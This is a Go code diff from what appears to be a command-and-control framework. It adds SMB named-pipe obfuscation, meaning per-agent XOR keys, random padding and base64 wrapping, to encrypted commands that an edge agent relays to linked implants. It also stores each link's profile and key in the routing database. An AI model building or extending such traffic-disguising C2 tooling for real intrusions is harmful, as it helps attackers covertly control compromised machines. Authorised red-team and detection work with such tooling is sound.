@@ -3,6 +3,7 @@ package listeners
 
 import (
 	"c2/internal/common/config"
+	"c2/internal/common/transforms"
 	pb "c2/proto"
 	"context"
 	"crypto"
@@ -45,8 +46,11 @@ type LinkHandshakeItem struct {
 
 // LinkCommandItem represents a command destined for a linked agent
 type LinkCommandItem struct {
-	RoutingID string `json:"r"`  // Short routing ID
-	Payload   string `json:"p"`  // Encrypted command payload
+	RoutingID     string `json:"r"`             // Short routing ID
+	Payload       string `json:"p"`             // Encrypted command payload (or transformed blob)
+	PrependLength int    `json:"pre,omitempty"` // Length of random prepend (for transform reversal)
+	AppendLength  int    `json:"app,omitempty"` // Length of random append (for transform reversal)
+	Transformed   bool   `json:"t,omitempty"`   // True if transforms are applied (even if no padding)
 }
 
 // NewLinkRouting creates a new link routing manager
@@ -77,23 +81,23 @@ func NewLinkRouting(db *sql.DB) (*LinkRouting, error) {
 }
 
 // RegisterLink registers a new link routing entry
-func (lr *LinkRouting) RegisterLink(edgeClientID, routingID, linkedClientID, linkType string) error {
+func (lr *LinkRouting) RegisterLink(edgeClientID, routingID, linkedClientID, linkType, smbProfile, smbXorKey string) error {
 	lr.mu.Lock()
 	defer lr.mu.Unlock()
 
 	_, err := lr.db.Exec(`
-		INSERT INTO link_routing (edge_clientID, routing_id, linked_clientID, link_type, created_at, last_seen, status)
-		VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 'active')
+		INSERT INTO link_routing (edge_clientID, routing_id, linked_clientID, link_type, smb_profile, smb_xor_key, created_at, last_seen, status)
+		VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 'active')
 		ON CONFLICT (edge_clientID, routing_id)
-		DO UPDATE SET linked_clientID = $3, link_type = $4, last_seen = CURRENT_TIMESTAMP, status = 'active'`,
-		edgeClientID, routingID, linkedClientID, linkType)
+		DO UPDATE SET linked_clientID = $3, link_type = $4, smb_profile = $5, smb_xor_key = $6, last_seen = CURRENT_TIMESTAMP, status = 'active'`,
+		edgeClientID, routingID, linkedClientID, linkType, smbProfile, smbXorKey)
 
 	if err != nil {
 		return fmt.Errorf("failed to register link: %w", err)
 	}
 
-	log.Printf("[LinkRouting] Registered link: edge=%s, routing=%s -> linked=%s (%s)",
-		edgeClientID, routingID, linkedClientID, linkType)
+	log.Printf("[LinkRouting] Registered link: edge=%s, routing=%s -> linked=%s (%s, profile=%s, xorKey=%v)",
+		edgeClientID, routingID, linkedClientID, linkType, smbProfile, smbXorKey != "")
 	return nil
 }
 
@@ -277,8 +281,53 @@ func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID 
 			continue
 		}
 
+		// Get SMB profile and XOR key for this agent to determine if transforms were applied
+		smbProfile := m.getSMBProfileForAgent(linkedClientID)
+		smbXorKey := m.getSMBXorKeyForAgent(linkedClientID)
+
+		// Extract padding lengths if present (for transform reversal)
+		prependLen := 0
+		appendLen := 0
+		if pre, ok := itemMap["pre"].(float64); ok {
+			prependLen = int(pre)
+		}
+		if app, ok := itemMap["app"].(float64); ok {
+			appendLen = int(app)
+		}
+
+		// Decode base64 payload
+		rawPayload, err := base64.StdEncoding.DecodeString(payload)
+		if err != nil {
+			log.Printf("[LinkData] Failed to decode base64 payload: %v", err)
+			continue
+		}
+
+		// Reverse transforms if profile has transforms
+		var encryptedPayload string
+		if smbProfile != nil && smbProfile.Data != nil && len(smbProfile.Data.Transforms) > 0 {
+			// Reverse transforms to get JSON envelope, then extract encrypted payload
+			encryptedPayload, err = reversePipeTransforms(rawPayload, smbProfile, prependLen, appendLen, smbXorKey)
+			if err != nil {
+				log.Printf("[LinkData] Failed to reverse SMB transforms for %s: %v", linkedClientID, err)
+				continue
+			}
+			log.Printf("[LinkData] Reversed transforms for %s (pre=%d, app=%d)", linkedClientID, prependLen, appendLen)
+		} else {
+			// Legacy mode - no transforms, parse JSON envelope directly
+			var envelope struct {
+				Type    string `json:"type"`
+				Payload string `json:"payload"`
+			}
+			if err := json.Unmarshal(rawPayload, &envelope); err != nil {
+				// Might be legacy format where payload is already the encrypted data
+				encryptedPayload = payload
+			} else {
+				encryptedPayload = envelope.Payload
+			}
+		}
+
 		// Decrypt the payload with the linked agent's secret
-		decryptedPayload, err := decryptLinkedPayload(payload, linkedConn.Secret1)
+		decryptedPayload, err := decryptLinkedPayload(encryptedPayload, linkedConn.Secret1)
 		if err != nil {
 			log.Printf("[LinkData] Failed to decrypt linked payload: %v", err)
 			continue
@@ -585,8 +634,14 @@ func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string,
 		})
 	}
 
-	// Register the link routing
-	if err := m.linkRouting.RegisterLink(edgeClientID, routingID, newClientID, "smb"); err != nil {
+	// Register the link routing with SMB profile and XOR key from init data
+	smbProfile := ""
+	smbXorKey := ""
+	if matchedInit != nil {
+		smbProfile = matchedInit.SMBProfile
+		smbXorKey = matchedInit.SMBXorKey
+	}
+	if err := m.linkRouting.RegisterLink(edgeClientID, routingID, newClientID, "smb", smbProfile, smbXorKey); err != nil {
 		return nil, fmt.Errorf("failed to register link: %w", err)
 	}
 
@@ -765,15 +820,51 @@ func (m *Manager) getCommandsForLinkedAgents(edgeClientID string) ([]LinkCommand
 
 		encryptedPayload, err := encryptForLinkedAgent(cmdJSON, linkedConn.Secret1)
 		if err != nil {
+			log.Printf("[LinkCommands] Failed to encrypt for %s: %v", linkedClientID, err)
 			continue
 		}
 
-		commands = append(commands, LinkCommandItem{
-			RoutingID: routingID,
-			Payload:   encryptedPayload,
-		})
+		// Get SMB profile and XOR key for this linked agent
+		smbProfile := m.getSMBProfileForAgent(linkedClientID)
+		smbXorKey := m.getSMBXorKeyForAgent(linkedClientID)
 
-		log.Printf("[LinkCommands] Prepared commands for linked agent %s (routing=%s)", linkedClientID, routingID)
+		// Check if we should use transforms or legacy mode
+		if smbProfile == nil || smbProfile.Data == nil || len(smbProfile.Data.Transforms) == 0 {
+			// Legacy mode - just send the encrypted payload
+			// The HTTPS agent will wrap it in JSON envelope {"type":"data","payload":"..."}
+			commands = append(commands, LinkCommandItem{
+				RoutingID:   routingID,
+				Payload:     encryptedPayload,
+				Transformed: false,
+			})
+			log.Printf("[LinkCommands] Prepared commands for linked agent %s (routing=%s, legacy mode)",
+				linkedClientID, routingID)
+		} else {
+			// Transforms mode - wrap in JSON envelope and apply transforms
+			// The server creates the full message, HTTPS agent just relays raw bytes
+			transformedData, prependLen, appendLen, err := applyPipeTransforms(encryptedPayload, smbProfile, smbXorKey)
+			if err != nil {
+				log.Printf("[LinkCommands] Failed to apply SMB transforms for %s: %v, falling back to legacy", linkedClientID, err)
+				// Fall back to legacy mode
+				commands = append(commands, LinkCommandItem{
+					RoutingID:   routingID,
+					Payload:     encryptedPayload,
+					Transformed: false,
+				})
+				continue
+			}
+
+			// Base64 encode the transformed data for transport
+			commands = append(commands, LinkCommandItem{
+				RoutingID:     routingID,
+				Payload:       base64.StdEncoding.EncodeToString(transformedData),
+				PrependLength: prependLen,
+				AppendLength:  appendLen,
+				Transformed:   true,
+			})
+			log.Printf("[LinkCommands] Prepared commands for linked agent %s (routing=%s, transforms mode)",
+				linkedClientID, routingID)
+		}
 	}
 
 	return commands, nil
@@ -985,4 +1076,170 @@ func signWithRSAKey(data []byte, rsaKeyBase64 string) ([]byte, error) {
 	}
 
 	return signature, nil
+}
+
+// =============================================================================
+// SMB TRANSFORM HELPERS
+// =============================================================================
+
+// getSMBProfileForAgent returns the SMB profile to use for a linked agent
+// TODO: In Phase 5+, this will look up the profile name from the agent's registration
+// getSMBProfileForAgent returns the SMB profile to use for a linked agent
+func (m *Manager) getSMBProfileForAgent(linkedClientID string) *config.SMBProfile {
+	if m.linkRouting == nil || m.linkRouting.config == nil {
+		return nil
+	}
+
+	// Look up the SMB profile name from the link_routing table
+	var profileName sql.NullString
+	err := m.db.QueryRow(`
+		SELECT smb_profile FROM link_routing
+		WHERE linked_clientID = $1 AND status = 'active'
+		LIMIT 1`,
+		linkedClientID).Scan(&profileName)
+
+	if err != nil || !profileName.Valid || profileName.String == "" {
+		// No profile configured - use legacy mode
+		log.Printf("[SMBTransform] No SMB profile configured for agent %s, using legacy mode", linkedClientID)
+		return nil
+	}
+
+	// Get the profile from config
+	profile := m.linkRouting.config.GetSMBProfile(profileName.String)
+	if profile == nil {
+		log.Printf("[SMBTransform] SMB profile '%s' not found in config for agent %s, using legacy mode",
+			profileName.String, linkedClientID)
+		return nil
+	}
+
+	log.Printf("[SMBTransform] Using SMB profile '%s' for agent %s", profileName.String, linkedClientID)
+	return profile
+}
+
+// getSMBXorKeyForAgent returns the per-build XOR key for a linked agent
+func (m *Manager) getSMBXorKeyForAgent(linkedClientID string) string {
+	// Try link_routing table first (for connected SMB agents)
+	var xorKey sql.NullString
+	err := m.db.QueryRow(`
+		SELECT smb_xor_key FROM link_routing
+		WHERE linked_clientID = $1 AND status = 'active'
+		LIMIT 1`,
+		linkedClientID).Scan(&xorKey)
+
+	if err == nil && xorKey.Valid && xorKey.String != "" {
+		log.Printf("[SMBTransform] Using per-agent XOR key for %s (from link_routing)", linkedClientID)
+		return xorKey.String
+	}
+
+	// Fall back to inits table via connections lookup
+	err = m.db.QueryRow(`
+		SELECT i.smb_xor_key FROM inits i
+		INNER JOIN connections c ON c.clientID = i.clientID::text
+		WHERE c.newclientID = $1`,
+		linkedClientID).Scan(&xorKey)
+
+	if err == nil && xorKey.Valid && xorKey.String != "" {
+		log.Printf("[SMBTransform] Using per-agent XOR key for %s (from inits)", linkedClientID)
+		return xorKey.String
+	}
+
+	log.Printf("[SMBTransform] No per-agent XOR key found for %s, using profile default", linkedClientID)
+	return ""
+}
+
+// overrideXorValue replaces XOR transform values with agent-specific key
+func overrideXorValue(xforms []transforms.Transform, xorKey string) []transforms.Transform {
+	if xorKey == "" {
+		return xforms
+	}
+
+	// Create copy with overridden XOR values
+	result := make([]transforms.Transform, len(xforms))
+	for i, t := range xforms {
+		result[i] = t
+		if t.Type == transforms.TransformXOR {
+			result[i].Value = xorKey
+		}
+	}
+	return result
+}
+
+// applyPipeTransforms wraps the payload in a JSON envelope and applies SMB transforms
+// Returns the transformed data and padding lengths for reversal
+// xorKeyOverride: if non-empty, replaces any XOR transform values
+func applyPipeTransforms(payload string, profile *config.SMBProfile, xorKeyOverride string) ([]byte, int, int, error) {
+	// Create JSON envelope that will be written to the pipe
+	envelope := map[string]string{
+		"type":    "data",
+		"payload": payload,
+	}
+	envelopeJSON, err := json.Marshal(envelope)
+	if err != nil {
+		return nil, 0, 0, fmt.Errorf("failed to marshal pipe envelope: %w", err)
+	}
+
+	// If no profile or no transforms, return the JSON as-is
+	if profile == nil || profile.Data == nil || len(profile.Data.Transforms) == 0 {
+		return envelopeJSON, 0, 0, nil
+	}
+
+	// Apply transforms
+	xforms := convertConfigTransforms(profile.Data.Transforms)
+
+	// Override XOR values if agent has a unique key
+	if xorKeyOverride != "" {
+		xforms = overrideXorValue(xforms, xorKeyOverride)
+	}
+
+	result, err := transforms.Apply(envelopeJSON, xforms)
+	if err != nil {
+		return nil, 0, 0, fmt.Errorf("failed to apply SMB transforms: %w", err)
+	}
+
+	log.Printf("[SMBTransform] Applied transforms: %d bytes -> %d bytes (prepend=%d, append=%d)",
+		len(envelopeJSON), len(result.Data), result.PrependLength, result.AppendLength)
+
+	return result.Data, result.PrependLength, result.AppendLength, nil
+}
+
+// reversePipeTransforms reverses SMB transforms and extracts the JSON envelope payload
+// xorKeyOverride: if non-empty, replaces any XOR transform values
+func reversePipeTransforms(data []byte, profile *config.SMBProfile, prependLen, appendLen int, xorKeyOverride string) (string, error) {
+	// If no profile or no transforms, parse JSON directly
+	if profile == nil || profile.Data == nil || len(profile.Data.Transforms) == 0 {
+		var envelope struct {
+			Type    string `json:"type"`
+			Payload string `json:"payload"`
+		}
+		if err := json.Unmarshal(data, &envelope); err != nil {
+			return "", fmt.Errorf("failed to parse pipe envelope: %w", err)
+		}
+		return envelope.Payload, nil
+	}
+
+	// Reverse transforms
+	xforms := convertConfigTransforms(profile.Data.Transforms)
+
+	// Override XOR values if agent has a unique key
+	if xorKeyOverride != "" {
+		xforms = overrideXorValue(xforms, xorKeyOverride)
+	}
+
+	reversed, err := transforms.Reverse(data, xforms, prependLen, appendLen)
+	if err != nil {
+		return "", fmt.Errorf("failed to reverse SMB transforms: %w", err)
+	}
+
+	log.Printf("[SMBTransform] Reversed transforms: %d bytes -> %d bytes", len(data), len(reversed))
+
+	// Parse the JSON envelope
+	var envelope struct {
+		Type    string `json:"type"`
+		Payload string `json:"payload"`
+	}
+	if err := json.Unmarshal(reversed, &envelope); err != nil {
+		return "", fmt.Errorf("failed to parse reversed pipe envelope: %w", err)
+	}
+
+	return envelope.Payload, nil
 }
